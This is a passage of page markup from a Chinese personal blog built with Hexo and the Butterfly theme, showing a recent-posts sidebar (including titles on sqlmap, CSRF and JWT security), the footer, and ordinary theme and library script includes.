href="/archives/4a17b156.html" title="博客说明">博客说明</a><time datetime="2026-05-07T10:55:15.145Z" title="发表于 2026-05-07 18:55:15">2026-05-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/ea185739.html" title="Sql注入之sqlmap的使用"><img src="/./img/sql_injection.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Sql注入之sqlmap的使用"/></a><div class="content"><a class="title" href="/archives/ea185739.html" title="Sql注入之sqlmap的使用">Sql注入之sqlmap的使用</a><time datetime="2026-05-07T08:00:00.000Z" title="发表于 2026-05-07 16:00:00">2026-05-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/667bd3bf.html" title="CSRF漏洞渗透与防御"><img src="/./img/CSRF.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CSRF漏洞渗透与防御"/></a><div class="content"><a class="title" href="/archives/667bd3bf.html" title="CSRF漏洞渗透与防御">CSRF漏洞渗透与防御</a><time datetime="2026-05-05T12:00:00.000Z" title="发表于 2026-05-05 20:00:00">2026-05-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/f9945f65.html" title="JWT渗透与防御"><img src="/./img/JWT.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JWT渗透与防御"/></a><div class="content"><a class="title" href="/archives/f9945f65.html" title="JWT渗透与防御">JWT渗透与防御</a><time datetime="2026-04-28T12:00:00.000Z" title="发表于 2026-04-28 20:00:00">2026-04-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/9508da4a.html" title="浏览器常用插件合集"><img src="/./img/plug_in.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="浏览器常用插件合集"/></a><div class="content"><a class="title" href="/archives/9508da4a.html" title="浏览器常用插件合集">浏览器常用插件合集</a><time datetime="2026-04-26T19:40:00.000Z" title="发表于 2026-04-27 03:40:00">2026-04-27</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By yunkun18</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div><div class="footer_custom_text">Hi, welcome to my <a href="https://blog.yunkun.top/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><script src="/js/tw_cn.js?v=5.5.4"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.9/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-fluttering-ribbon.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/click-show-text.min.js" data-mobile="true" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="false" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/metingjs/dist/Meting.min.js"></script><script>(() => {
   const destroyAplayer = () => {
     if (window.aplayers) {
       for (let i = 0; i < window.aplayers.length; i++) {
